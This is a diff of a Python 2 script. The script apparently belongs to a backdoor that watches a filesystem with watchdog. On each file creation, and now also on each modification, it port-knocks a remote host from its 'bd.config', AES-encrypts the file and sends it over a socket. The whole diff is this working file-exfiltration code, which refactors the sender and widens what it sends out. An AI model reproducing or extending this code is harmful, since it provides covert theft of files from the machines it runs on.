@@ -1,17 +1,14 @@
 #!/bin/env python
-from watchdog.events import PatternMatchingEventHandler
+from watchdog.events import PatternMatchingEventHandler, DirModifiedEvent
 from watchdog.observers import Observer
 import ConfigParser
 import socket
 import time
 from dcaes import AESCipher
-import os
 
 
-class FSEventHandler(PatternMatchingEventHandler):
-    def __init__(self, patterns=None):
-        print('watch added')
-        PatternMatchingEventHandler.__init__(self, patterns)
+class FileSender(object):
+    def __init__(self):
         config = ConfigParser.ConfigParser()
         config.read('./bd.config')
         self.sequence = config.get('FileMonitor', 'sequence').split(',')
@@ -20,21 +17,38 @@ class FSEventHandler(PatternMatchingEventHandler):
         self.key = config.get('Setup', 'enkey')
         self.cipher = AESCipher(self.key)
 
-    def on_created(self, event):
-        print('CREATED: ' + str(event))
-
+    def send_file(self, filename):
         knocker = PortKnocker(self.sequence, self.remote_host)
         knocker.knock()
-        self.send_file(event.src_path)
-
-    def send_file(self, filename):
-        time.sleep(2)
+        time.sleep(1)
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((self.remote_host, int(self.file_port)))
         enc = self.cipher.encrypt_file(filename)
 
         sock.sendall(enc)
         sock.send(b'EOF')
+
+
+class FSEventHandler(PatternMatchingEventHandler):
+    def __init__(self, patterns=None):
+        print('watch added')
+        PatternMatchingEventHandler.__init__(self, patterns)
+        self.sender = FileSender()
+
+    def on_created(self, event):
+        # print('CREATED: ' + str(event))
+        self.send_file(event.src_path)
+
+    def on_modified(self, event):
+        # we only care about specific files
+        if type(event) == DirModifiedEvent:
+            return
+
+        # print('MODIFIED: ' + str(event))
+        self.send_file(event.src_path)
+
+    def send_file(self, filename):
+        self.sender.send_file(filename)
 
 
 class FileMonitor(object):
